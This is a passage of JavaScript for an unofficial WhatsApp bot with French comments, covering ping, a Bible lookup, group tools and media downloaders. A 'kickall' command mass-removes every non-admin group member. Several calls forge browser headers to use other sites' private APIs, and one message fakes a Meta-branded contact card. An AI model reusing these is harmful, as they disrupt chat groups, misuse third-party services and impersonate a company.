        }, { quoted: msg });
        break;
    }

    await socket.sendMessage(sender, { 
        react: { text: "⏳", key: msg.key } 
    });

    try {
        const userJid = jidNormalizedUser(socket.user.id);
        
        // Forwarder directement le message cité
        await socket.sendMessage(userJid, {
            forward: {
                key: {
                    remoteJid: from,
                    fromMe: false,
                    id: msg.key.id
                },
                message: quoted
            }
        });

        // Seulement la réaction de succès, pas de message texte
        await socket.sendMessage(sender, { 
            react: { text: "✅", key: msg.key } 
        });

    } catch (e) {
        console.error("[SAVE ERROR]:", e);
        await socket.sendMessage(sender, { 
            react: { text: "❌", key: msg.key } 
        });
        // Optionnel: garder le message d'erreur
        // await socket.sendMessage(sender, { 
        //     text: `❌ Erreur: ${e.message}` 
        // }, { quoted: msg });
    }
    break;
}

// ---------------------- PING ----------------------
case 'ping': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;

    // Latence réelle = différence entre maintenant et le timestamp du message
    const latency = Date.now() - (msg.messageTimestamp * 1000);

    // Qualité selon latence
    let quality = '';
    let dot = '🟢';
    if (latency <= 10) {
      quality = 'EXCELLENT';
      dot = '🟢';
    } else if (latency <= 50) {
      quality = 'TRÈS BON';
      dot = '🟢';
    } else if (latency <= 150) {
      quality = 'BON';
      dot = '🟡';
    } else if (latency <= 400) {
      quality = 'MOYEN';
      dot = '🟠';
    } else {
      quality = 'MAUVAIS';
      dot = '🔴';
    }

    // Uptime
    const uptimeMs  = process.uptime() * 1000;
    const uptimeH   = Math.floor(uptimeMs / 3600000);
    const uptimeM   = Math.floor((uptimeMs % 3600000) / 60000);
    const uptimeS   = Math.floor((uptimeMs % 60000) / 1000);
    const uptimeStr = `${uptimeH}h ${uptimeM}m ${uptimeS}s`;

    // Mémoire
    const memMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);

    // Date
    const dateStr = new Date().toLocaleDateString('en-GB', {
      day: '2-digit', month: 'short', year: 'numeric',
      timeZone: 'America/Port-au-Prince'
    });

    const text = [
      `*╭───────────◇*`,
      `│ ✧ ʙᴏᴛ: ${botName}`,
      `│ ✧ sᴘᴇᴇᴅ: ${dot} ${latency}ms`,
      `│ ✧ ǫᴜᴀʟɪᴛʏ: ${quality}`,
      `│ ✧ ᴅᴀᴛᴇ: ${dateStr}`,
      `│ ✧ ᴜᴘᴛɪᴍᴇ: ${uptimeStr}`,
      `│ ✧ ᴍᴇᴍᴏʀʏ: ${memMB}ᴍʙ`,
      `│ ✧ ᴜsᴇʀ: ${botName}`,
      `│ ✧ ᴅᴇᴠ: DOBERTO`,
      `*╰───────────◇*`,
      ``,
      `> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`
    ].join('\n');

    await socket.sendMessage(sender, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: text,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });

  } catch(e) {
    console.error('❌ Erreur ping:', e);
    await socket.sendMessage(sender, {
      text: '❌ Impossible de mesurer la latence.'
    }, { quoted: msg });
  }
  break;
}

            case 'bibleai':
            case 'bible':
            case 'verset': {
                if (!args[0]) {
                    await socket.sendMessage(sender, { 
                        text: `Usage: !${command} [ta question]\nExemple: !${command} Qui est Jésus ?` 
                    }, { quoted: msg });
                    break;
                }

                const question = args.join(' ');
                await socket.sendMessage(sender, { 
                    text: "_🔍 Recherche dans les écritures..._" 
                }, { quoted: msg });

                try {
                    const params = new URLSearchParams({
                        question: question,
                        translation: 'LSG',
                        language: 'fr',
                        'filters[]': ['bible', 'books', 'articles'],
                        pro: 'false'
                    });

                    const url = `https://api.bibleai.com/v2/search?${params.toString()}`;
                    const fetch = require('node-fetch');
                    const res = await fetch(url, {
                        headers: {
                            'User-Agent': 'Mozilla/5.0',
                            'Accept': 'application/json',
                            'Origin': 'https://bibleai.com',
                            'Referer': 'https://bibleai.com/'
                        }
                    });

                    const json = await res.json();

                    if (json.status !== 1 || !json.data) {
                        await socket.sendMessage(sender, { 
                            text: 'Désolé, je n\'ai trouvé aucun résultat.' 
                        }, { quoted: msg });
                        break;
                    }

                    const { answer, sources } = json.data;
                    let responseText = `📖 *BIBLE AI RESPONSE*\n\n${answer}\n\n`;

                    if (Array.isArray(sources) && sources.length > 0) {
                        responseText += `📑 *SOURCES & VERSETS :*\n`;
                        const verses = sources.filter(s => s.type === 'verse').slice(0, 8);

                        verses.forEach((s, i) => {
                            let reference = s.title || s.metadata?.ref || `Source [${i + 1}]`;
                            let content = s.text.trim();

                            if (s.book && s.chapter) {
                                reference = `${s.book} ${s.chapter}:${s.verse || ''}`;
                            }

                            responseText += `\n${i + 1}. *${reference}*\n${content}\n`;
                        });
                    }

                    await socket.sendMessage(sender, { text: responseText }, { quoted: msg });

                } catch (e) {
                    console.error(e);
                    await socket.sendMessage(sender, { 
                        text: `❌ Erreur : ${e.message}` 
                    }, { quoted: msg });
                }
                break;
            }

            // ============ CRÉATION DE GROUPE ============
            case 'creategroup':
            case 'cgroup': {
                if (!args[0]) {
                    await socket.sendMessage(sender, { 
                        text: `Usage: !${command} [Nom du groupe]\n\nVous pouvez aussi répondre à une image pour l'utiliser comme photo de profil.` 
                    }, { quoted: msg });
                    break;
                }

                const groupName = args.join(' ');
                await socket.sendMessage(sender, { text: "⏳ Création du groupe en cours..." }, { quoted: msg });

                try {
                    // Créer le groupe
                    const group = await socket.groupCreate(groupName, [sender]);
                    
                    let response = `✅ Groupe "${groupName}" créé avec succès !`;

                    // Promouvoir le créateur en admin
                    try {
                        await socket.groupParticipantsUpdate(group.id, [sender], "promote");
                        response += `\n\n👑 ${sender.split("@")[0]} a été promu admin automatiquement.`;
                    } catch (e) {
                        response += `\n\n(Échec de la promotion automatique en admin.)`;
                    }

                    // Générer le lien d'invitation
                    try {
                        const code = await socket.groupInviteCode(group.id);
                        const inviteLink = `https://chat.whatsapp.com/${code}`;
                        response += `\n\n*Lien d'invitation :* ${inviteLink}`;
                    } catch (e) {
                        response += `\n\n(Impossible de générer un lien d'invitation.)`;
                    }

                    // Gérer la photo de profil si disponible
                    if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
                        try {
                            const mediaMsg = msg.message.extendedTextMessage.contextInfo.quotedMessage;
                            const media = await socket.downloadMediaMessage(mediaMsg);
                            await socket.updateProfilePicture(group.id, media);
                            response += `\n\n🖼️ Photo de profil mise à jour !`;
                        } catch (e) {
                            console.error(e);
                            response += `\n\n(Échec de la mise à jour de la photo de profil.)`;
                        }
                    }

                    await socket.sendMessage(sender, { text: response }, { quoted: msg });

                } catch (e) {
                    console.error(e);
                    await socket.sendMessage(sender, { 
                        text: `❌ Erreur lors de la création du groupe : ${e.message}` 
                    }, { quoted: msg });
                }
                break;
            }

            // ============ KICK ALL ============
            case 'kickall': {
                if (!from.endsWith('@g.us')) {
                    await socket.sendMessage(sender, { 
                        text: "❗ Cette commande doit être utilisée dans un groupe." 
                    }, { quoted: msg });
                    break;
                }

                try {
                    const metadata = await socket.groupMetadata(from);
                    const participants = metadata.participants || [];
                    const groupName = metadata.subject || "Sans nom";

                    const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
                    const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

                    // Membres à expulser (non-admins, pas le bot)
                    const toKick = participants.filter(p => 
                        !groupAdmins.includes(p.id) && p.id !== botNumber
                    );

                    if (!toKick.length) {
                        await socket.sendMessage(from, { 
                            text: "❌ Aucun membre à expulser (seulement des admins ou le bot)." 
                        }, { quoted: msg });
                        break;
                    }

                    // Liste numérotée
                    let kickLines = "";
                    toKick.forEach((mem, i) => {
                        const num = mem.id.split('@')[0];
                        kickLines += `☠️ ${(i + 1).toString().padStart(2, '0')}. @${num}\n`;
                    });

                    // Message pirate stylé
                    const caption = `✦━━━━━━━━━━━━━━━━━━━━✦
🏴‍☠️ *DOBERTO-XD KICKALL* 🏴‍☠️
✦━━━━━━━━━━━━━━━━━━━━✦

📌 GROUPE : ${groupName}
⚓ Ordre donné par : @${sender.split('@')[0]}

💬 Vous tous avez étés jugés indigne de persister dans ce groupe🚶. Le roi des bêtes à scellé votre destin 🐉!
👥 Membres expulsés : ${toKick.length}

${kickLines}
✦━━━━━━━━━━━━━━━━━━━━✦
🔥 DOBERTO-XD`;

                    // Annonce avant expulsion
                    await socket.sendMessage(from, {
                        text: caption,
                        mentions: [sender, ...toKick.map(p => p.id)]
                    }, { quoted: msg });

                    // Expulsion en un seul coup
                    await socket.groupParticipantsUpdate(from, toKick.map(p => p.id), "remove");

                    await socket.sendMessage(from, { 
                        text: "✅ Tous ces indignes seront supprimés d'un coup" 
                    }, { quoted: msg });

                } catch (e) {
                    console.error("[ERROR kickall]", e);
                    await socket.sendMessage(sender, { 
                        text: `❌ Erreur lors du kickall.\n\n${e.message || e}` 
                    }, { quoted: msg });
                }
                break;
            }

            // ============ LISTE ADMINS ============
            case 'listadmin': {
                if (!from.endsWith('@g.us')) {
                    await socket.sendMessage(sender, { 
                        text: "❗ Cette commande doit être utilisée dans un groupe." 
                    }, { quoted: msg });
                    break;
                }

                try {
                    const metadata = await socket.groupMetadata(from);
                    const participants = metadata.participants || [];

                    // Liste des admins
                    const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

                    if (!groupAdmins.length) {
                        await socket.sendMessage(from, { 
                            text: "❌ Aucun admin détecté dans ce groupe." 
                        }, { quoted: msg });
                        break;
                    }

                    let caption = `👥 *LISTE DES ADMINS DU GROUPE*\n\n`;
                    groupAdmins.forEach((admin, i) => {
                        caption += `${(i + 1).toString().padStart(2, '0')}. @${admin.split('@')[0]}\n`;
                    });

                    await socket.sendMessage(from, {
                        text: caption,
                        mentions: groupAdmins
                    }, { quoted: msg });

                } catch (e) {
                    console.error("[ERROR listadmin]", e);
                    await socket.sendMessage(sender, { 
                        text: `❌ Erreur lors de la récupération des admins.\n\n${e.message || e}` 
                    }, { quoted: msg });
                }
                break;
            }

            // ============ PLAY YOUTUBE ============
            case 'play':
case 'playaudio':
case 'playvideo':
case 'playptt': {
    if (!args[0]) {
        await socket.sendMessage(sender, { 
            text: `❌ Utilisation incorrecte.\n\n📌 Exemple:\n!${command} Alan Walker Faded` 
        }, { quoted: msg });
        break;
    }

    const searchQuery = args.join(' ');
    const axios = require('axios');

    // Réaction initiale
    await socket.sendMessage(sender, { 
        react: { text: "✨", key: msg.key } 
    });

    // Fonction pour obtenir l'URL de la vidéo
    async function getVideoUrl(query) {
        let videoUrl = query;
        let videoTitle = "";
        
        if (!query.startsWith('http')) {
            const { videos } = await yts(query);
            if (!videos || videos.length === 0) {
                throw new Error("Aucun résultat trouvé");
            }
            videoUrl = videos[0].url;
            videoTitle = videos[0].title;
        }

        return { videoUrl, videoTitle };
    }

    // Liste d'APIs de secours (rapides)
    const apis = [
        // API 1: Dlance (rapide)
        {
            name: 'Dlance',
            video: (url) => `https://dlance.com/api/ytdl?url=${encodeURIComponent(url)}`,
            audio: (url) => `https://dlance.com/api/ytmp3?url=${encodeURIComponent(url)}`,
            parser: (data) => ({
                download: data.result?.url || data.url,
                title: data.result?.title || data.title
            })
        },
        // API 2: API Vihangayt (très rapide)
        {
            name: 'Vihanga',
            video: (url) => `https://api.vihangayt.com/download/ytmp4?url=${encodeURIComponent(url)}`,
            audio: (url) => `https://api.vihangayt.com/download/ytmp3?url=${encodeURIComponent(url)}`,
            parser: (data) => ({
                download: data.data?.url || data.url,
                title: data.data?.title || data.title
            })
        },
        // API 3: Paja (rapide aussi)
        {
            name: 'Paja',
            video: (url) => `https://paja.si/ytmp4?url=${encodeURIComponent(url)}`,
            audio: (url) => `https://paja.si/ytmp3?url=${encodeURIComponent(url)}`,
            parser: (data) => ({
                download: data.url,
                title: data.title
            })
        }
    ];

    // Fonction de téléchargement avec fallback
    async function downloadWithFallback(videoUrl, type = 'video') {
        let lastError = '';
        
        for (const api of apis) {
            try {
                console.log(`[API] Trying ${api.name} for ${type}...`);
                
                const apiUrl = api[type](videoUrl);
                const response = await axios.get(apiUrl, { 
                    timeout: 10000, // 10 secondes max par API
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });
                
                if (!response.data) continue;
                
                const parsed = api.parser(response.data);
                
                if (parsed.download) {
                    console.log(`[API] ${api.name} success!`);
                    return {
                        download: parsed.download,
                        title: parsed.title || 'Video',
                        api: api.name
                    };
                }
            } catch (e) {
                lastError = e.message;
                console.log(`[API] ${api.name} failed:`, e.message);
                continue;
            }
        }
        
        throw new Error(`Toutes les APIs ont échoué: ${lastError}`);
    }

    if (command === 'play') {
        try {
            const { videoUrl, videoTitle } = await getVideoUrl(searchQuery);
            
            const buttons = [
                {
                    buttonId: `.playaudio ${videoUrl}`,
                    buttonText: { displayText: "🎵 Audio" },
                    type: 1
                },
                {
                    buttonId: `.playvideo ${videoUrl}`,
                    buttonText: { displayText: "🎬 Vidéo" },
                    type: 1
                },
                {
                    buttonId: `.playptt ${videoUrl}`,
                    buttonText: { displayText: "🎤 PTT" },
                    type: 1
                }
            ];

            await socket.sendMessage(sender, {
                text: `🎶 *YouTube*\n\n📌 *${videoTitle}*\n\nChoisis le format :`,
                footer: "Sélectionne un bouton",
                buttons: buttons,
                headerType: 4
            }, { quoted: msg });

            await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

        } catch (e) {
            console.error("PLAY MENU ERROR:", e);
            await socket.sendMessage(sender, { 
                text: `❌ ${e.message}` 
            }, { quoted: msg });
        }
    } 
    else if (command === 'playaudio' || command === 'playptt') {
        await socket.sendMessage(sender, { 
            react: { text: command === 'playaudio' ? "🎵" : "🎤", key: msg.key } 
        });

        try {
            const { videoUrl, videoTitle } = await getVideoUrl(searchQuery);
            const isPTT = command === 'playptt';
            
            await socket.sendMessage(sender, { 
                text: "⏳ Recherche de l'audio..." 
            });

            // Essayer les APIs pour l'audio
            const audioData = await downloadWithFallback(videoUrl, 'audio');
            
            await socket.sendMessage(sender, { 
                text: `✅ Trouvé sur ${audioData.api}, téléchargement...` 
            });

            // Télécharger le buffer audio
            const audioRes = await axios.get(audioData.download, { 
                responseType: 'arraybuffer',
                timeout: 30000
            });
            const audioBuffer = Buffer.from(audioRes.data);

            await socket.sendMessage(sender, {
                audio: audioBuffer,
                mimetype: "audio/mpeg",
                ptt: isPTT,
                caption: `${isPTT ? '🎤' : '🎵'} *${audioData.title || videoTitle}*`
            }, { quoted: msg });

            await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

        } catch (e) {
            console.error("AUDIO ERROR:", e);
            
            // Dernier recours: envoyer le lien YouTube
            try {
                const { videoUrl } = await getVideoUrl(searchQuery);
                await socket.sendMessage(sender, { 
                    text: `❌ Téléchargement impossible.\n\n🔗 Lien direct: ${videoUrl}` 
                }, { quoted: msg });
            } catch {}
            
            await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
        }
    } 
    else if (command === 'playvideo') {
        await socket.sendMessage(sender, { 
            react: { text: "🎬", key: msg.key } 
        });

        try {
            const { videoUrl, videoTitle } = await getVideoUrl(searchQuery);
            
            await socket.sendMessage(sender, { 
                text: "⏳ Recherche de la vidéo..." 
            });

            // Essayer les APIs pour la vidéo
            const videoData = await downloadWithFallback(videoUrl, 'video');
            
            await socket.sendMessage(sender, { 
                text: `✅ Trouvé sur ${videoData.api}, envoi...` 
            });

            await socket.sendMessage(sender, {
                video: { url: videoData.download },
                caption: `🎬 *${videoData.title || videoTitle}*`
            }, { quoted: msg });

            await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

        } catch (e) {
            console.error("VIDEO ERROR:", e);
            
            // Dernier recours: envoyer le lien YouTube
            try {
                const { videoUrl } = await getVideoUrl(searchQuery);
                await socket.sendMessage(sender, { 
                    text: `❌ Téléchargement impossible.\n\n🔗 Lien direct: ${videoUrl}` 
                }, { quoted: msg });
            } catch {}
            
            await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
        }
    }
    break;
}
            // ============ COMMANDE INCONNUE ============
// === COMMANDE UPSCALE (amélioration d'image) ===
// === COMMANDE UPSCALE (amélioration d'image) ===
case 'upscale': {
  try {
    // Définir les variables nécessaires
    const jid = msg.key.remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;
    
    // Fonction aienhancer intégrée avec améliorations
    async function aienhancer(image, {
      model = 3,
      settings = 'kRpBbpnRCD2nL2RxnnuoMo7MBc0zHndTDkWMl9aW+Gw='
    } = {}) {
      if (!image) throw new Error('image is required');
      
      let base64;
      if (/^https?:\/\//.test(image)) {
        const img = await axios.get(image, { 
          responseType: 'arraybuffer',
          timeout: 30000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });
        base64 = Buffer.from(img.data).toString('base64');
      } else {
        // Lire le fichier et vérifier qu'il n'est pas corrompu
        const fileBuffer = fs.readFileSync(image);
        if (fileBuffer.length < 100) {
          throw new Error('Fichier image trop petit ou corrompu');
        }
        base64 = fileBuffer.toString('base64');
      }

      // S'assurer que l'image est au bon format (PNG recommandé)
      const imageData = `data:image/png;base64,${base64}`;

      const headers = {
        'authority': 'aienhancer.ai',
        'accept': '*/*',
        'accept-language': 'id-ID,id;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://aienhancer.ai',
        'referer': 'https://aienhancer.ai/hd-picture-converter',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
      };

      // Créer la tâche avec timeout
      const create = await axios.post('https://aienhancer.ai/api/v1/r/image-enhance/create',
        {
          model,
          image: imageData,
          settings
        },
        { 
          headers,
          timeout: 30000
        }
      );

      if (!create.data?.data?.id) {
        console.error('[AIENHANCER] Create response:', create.data);
        throw new Error('Réponse invalide du serveur');
      }

      const taskId = create.data.data.id;

      // Attendre le résultat avec un timeout global
      const maxAttempts = 30; // 30 * 2s = 60 secondes max
      let attempts = 0;

      while (attempts < maxAttempts) {
        await new Promise(r => setTimeout(r, 2000));
        attempts++;

        const result = await axios.post('https://aienhancer.ai/api/v1/r/image-enhance/result',
          { task_id: taskId },
          { 
            headers,
            timeout: 30000
          }
        );

        const status = result.data?.data?.status;

        if (status === 'succeeded') {
          return {
            id: result.data.data.id,
            input: result.data.data.input,
            output: result.data.data.output,
            completed_at: result.data.data.completed_at
          };
        }

        if (status === 'failed') {
          throw new Error('Échec de l\'amélioration');
        }
      }

      throw new Error('Timeout: Le traitement a pris trop de temps');
    }

    // Vérifier si on a une image (citée ou dans le message)
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const selfMedia = msg.message?.imageMessage;
    
    if (!quoted && !selfMedia) {
      await socket.sendMessage(sender, {
        text: `❌ Réponds à une image ou envoie une image avec la commande .upscale\nExemple: ${prefix}upscale (en répondant à une image)`
      }, { quoted: msg });
      break;
    }

    // Réaction d'attente
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });

    // Récupérer l'image
    let imageBuffer;
    let imageMime;
    
    try {
      if (quoted) {
        // Image citée
        if (quoted.imageMessage) {
          const stream = await downloadContentFromMessage(quoted.imageMessage, 'image');
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          imageBuffer = Buffer.concat(chunks);
          imageMime = quoted.imageMessage.mimetype || 'image/jpeg';
        } else if (quoted.stickerMessage) {
          // Convertir sticker en image
          const stream = await downloadContentFromMessage(quoted.stickerMessage, 'sticker');
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          const stickerBuffer = Buffer.concat(chunks);
          
          // Vérifier si sharp est disponible
          let sharp;
          try {
            sharp = require('sharp');
          } catch (e) {
            await socket.sendMessage(sender, { 
              text: '❌ La conversion sticker → image nécessite sharp. Installe-le avec: npm install sharp'
            }, { quoted: msg });
            break;
          }
          
          // Convertir WebP en PNG avec gestion d'erreur
          try {
            imageBuffer = await sharp(stickerBuffer)
              .png()
              .toBuffer();
            imageMime = 'image/png';
          } catch (sharpErr) {
            console.error('[SHARP ERROR]', sharpErr);
            await socket.sendMessage(sender, { 
              text: '❌ Erreur lors de la conversion du sticker en image.'
            }, { quoted: msg });
            break;
          }
        } else {
          await socket.sendMessage(sender, { 
            text: '❌ Le message cité n\'est pas une image ou un sticker.'
          }, { quoted: msg });
          break;
        }
      } else if (selfMedia) {
        // Image dans le message courant
        const stream = await downloadContentFromMessage(selfMedia, 'image');
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        imageBuffer = Buffer.concat(chunks);
        imageMime = selfMedia.mimetype || 'image/jpeg';
      }
    } catch (downloadErr) {
      console.error('[DOWNLOAD ERROR]', downloadErr);
      await socket.sendMessage(sender, { 
        text: '❌ Erreur lors du téléchargement de l\'image.'
      }, { quoted: msg });
      break;
    }

    if (!imageBuffer || imageBuffer.length < 100) {
      await socket.sendMessage(sender, { 
        text: '❌ Image invalide ou corrompue.'
      }, { quoted: msg });
      break;
    }

    // Vérifier la taille de l'image (max 10MB pour l'API)
    if (imageBuffer.length > 10 * 1024 * 1024) {
      await socket.sendMessage(sender, { 
        text: '❌ L\'image est trop volumineuse (max 10MB).'
      }, { quoted: msg });
      break;
    }

    // Optimiser l'image avec sharp si disponible
    try {
      const sharp = require('sharp');
      // Redimensionner si trop grande et convertir en PNG
      imageBuffer = await sharp(imageBuffer)
        .resize(1920, 1080, { fit: 'inside', withoutEnlargement: true })
        .png({ quality: 90 })
        .toBuffer();
      imageMime = 'image/png';
    } catch (sharpErr) {
      console.warn('[SHARP OPTIMIZE]', sharpErr.message);
      // Continuer sans optimisation
    }

    // Sauvegarder temporairement l'image
    const tempDir = './temp';
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    
    const tempPath = `${tempDir}/upscale_${Date.now()}.png`;
    fs.writeFileSync(tempPath, imageBuffer);

    // Message de progression
    await socket.sendMessage(sender, { 
      text: '🔄 Amélioration de l\'image en cours... (cela peut prendre jusqu\'à 60 secondes)'
    }, { quoted: msg });

    try {
      // Appeler aienhancer
      const result = await aienhancer(tempPath, {
        model: 3, // 1, 2, 3, 4 (différents niveaux)
        settings: 'kRpBbpnRCD2nL2RxnnuoMo7MBc0zHndTDkWMl9aW+Gw='
      });

      if (!result || !result.output) {
        throw new Error('Échec de l\'amélioration');
      }

      // Télécharger l'image améliorée
      const enhancedResponse = await axios.get(result.output, { 
        responseType: 'arraybuffer',
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      
      const enhancedBuffer = Buffer.from(enhancedResponse.data);

      // Vérifier que l'image améliorée est valide
      if (enhancedBuffer.length < 100) {
        throw new Error('Image améliorée invalide');
      }

      // Envoyer l'image améliorée
      await socket.sendMessage(sender, {
        image: enhancedBuffer,
        caption: `✅ Image améliorée avec succès !\n\n📊 *Informations:*\n• Modèle: ${model}\n• Taille originale: ${(imageBuffer.length / 1024).toFixed(2)} KB\n• Taille améliorée: ${(enhancedBuffer.length / 1024).toFixed(2)} KB\n\n🔗 Lien: ${result.output || 'N/A'}`
      }, { quoted: msg });

      // Réaction de succès
      await socket.sendMessage(jid, { react: { text: "✨", key: msg.key } });

    } catch (apiErr) {
      console.error('[API ERROR]', apiErr);
      
      let errorMessage = apiErr.message;
      if (apiErr.response?.status === 400) {
        errorMessage = 'Format d\'image non supporté. Essayez avec une autre image.';
      } else if (apiErr.response?.status === 413) {
        errorMessage = 'Image trop volumineuse pour l\'API.';
      } else if (apiErr.code === 'ECONNABORTED') {
        errorMessage = 'Timeout de connexion.';
      }
      
      await socket.sendMessage(sender, { 
        text: `❌ Erreur API: ${errorMessage}`
      }, { quoted: msg });
      
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
      
    } finally {
      // Nettoyer le fichier temporaire
      try {
        fs.unlinkSync(tempPath);
      } catch (cleanErr) {
        console.warn('[CLEANUP]', cleanErr.message);
      }
    }

  } catch (e) {
    console.error('[UPSCALE ERROR]', e);
    
    const jid = msg?.key?.remoteJid;
    const sender = msg?.key?.participant || msg?.key?.remoteJid;
    
    let errorMessage = e.message;
    if (e.response) {
      errorMessage += ` (Status: ${e.response.status})`;
    }
    
    // Messages d'erreur personnalisés
    if (errorMessage.includes('400')) {
      errorMessage = 'Format d\'image non supporté. Essayez avec une image JPG ou PNG.';
    } else if (errorMessage.includes('413')) {
      errorMessage = 'Image trop volumineuse (max 10MB).';
    } else if (errorMessage.includes('timeout')) {
      errorMessage = 'Délai d\'attente dépassé. Réessayez plus tard.';
    }
    
    await socket.sendMessage(sender, { 
      text: `❌ Erreur: ${errorMessage}`
    }, { quoted: msg });
    
    try {
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    } catch (reactErr) {}
  }
  break;
}
            

case 'active': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;

    // Vérification admin
    const admins = await loadAdminsFromMongo();
    const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');
    const isAdmin = admins.some(admin => 
      admin === nowsender || admin.includes(senderIdSimple)
    );

    if (!isAdmin) {
      await socket.sendMessage(sender, { 
        text: '❌ Accès réservé aux administrateurs.' 
      }, { quoted: msg });
      break;
    }

    const activeCount = activeSockets.size;
    const activeNumbers = Array.from(activeSockets.keys());

    // Meta mention
    const metaQuote = {
      key: { 
        remoteJid: "status@broadcast", 
        participant: "0@s.whatsapp.net", 
        fromMe: false, 
        id: "META_AI_ACTIVESESSIONS" 
      },
      message: { 
        contactMessage: { 
          displayName: botName, 
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` 
        } 
      }
    };

    // Texte avec le même design que .alive / .ping / .menu
    let text = [
      `*╭───────────◇*`,
      `│ ✧ ᴛɪᴛʀᴇ: sᴇssɪᴏɴs ᴀᴄᴛɪᴠᴇs`,
      `│ ✧ ᴛᴏᴛᴀʟ: ${activeCount}`,
      `│ ✧ ʜᴇᴜʀᴇ: ${getHaitiTimestamp()}`,
      `│ ✧ ғᴜsᴇᴀᴜ: ʜᴀïᴛɪ`,
      `│ ✧ ᴅᴇᴠ: DOBERTO`,
      `*╰───────────◇*`
    ].join('\n');

    if (activeCount > 0) {
      text += '\n\n' + [
        `*╭───────────◇*`,
        ...activeNumbers.map((num, index) => `│ ✧ 🟢 ${String(index + 1).padStart(2, '0')}. ${num}`),
        `*╰───────────◇*`
      ].join('\n');

      text += '\n\n' + [
        `│ ✧ ᴅᴇɴsɪᴛé: ${Math.min(100, Math.round((activeCount / 50) * 100))}%`,
        `│ ✧ ᴘᴇʀғᴏʀᴍᴀɴᴄᴇ: ${activeCount > 10 ? "Élevée" : activeCount > 5 ? "Moyenne" : "Basse"}`,
        `│ ✧ sᴛᴀᴛᴜᴛ: ᴏᴘéʀᴀᴛɪᴏɴɴᴇʟ ✅`,
        ``,
        `💡 Les sessions sont stables et actives.`
      ].join('\n');
    } else {
      text += '\n\n' + [
        `⚠️ AUCUN BOT CONNECTÉ`,
        ``,
        `Recommandations :`,
        `• Vérifier la connexion internet`,
        `• Consulter les logs système`,
        `• Attendre la reconnexion automatique`
      ].join('\n');
    }

    text += `\n\n> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`;

    // Image
    const logo = cfg.logo || config.RCD_IMAGE_PATH;
    let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: text,
      footer: `${botName} • Système de monitoring`,
      headerType: 4
    }, { quoted: metaQuote });

  } catch(e) {
    console.error('❌ Erreur bots:', e);
    await socket.sendMessage(sender, { 
      text: '❌ Impossible d\'accéder aux données des sessions.' 
    }, { quoted: msg });
  }
  break;
}


// === COMMANDE FACEBOOK DOWNLOADER ===
// === COMMANDE FACEBOOK DOWNLOADER ===
case 'facebook': {
  try {
    // Définir jid à partir de remoteJid (disponible dans ton contexte)
    const jid = remoteJid; // ou msg.key.remoteJid selon ce qui est disponible
    const sender = msg.key.participant || msg.key.remoteJid;
    
    // Vérifier si un lien est fourni
    const url = args.join(' ').trim();
    
    if (!url) {
      await socket.sendMessage(sender, {
        text: `❌ Exemple: ${prefix}${command} https://fb.watch/xxxxxx/`
      }, { quoted: msg });
      break;
    }

    // Vérifier que c'est un lien Facebook valide
    if (!url.match(/(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\/.*/i)) {
      await socket.sendMessage(sender, {
        text: '❌ Lien Facebook invalide. Utilise un lien comme: https://fb.watch/xxxxxx/'
      }, { quoted: msg });
      break;
    }

    // Réaction d'attente
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });
    await socket.sendMessage(sender, { text: '🔄 Téléchargement en cours...' }, { quoted: msg });

    // Appel à l'API fdownloader
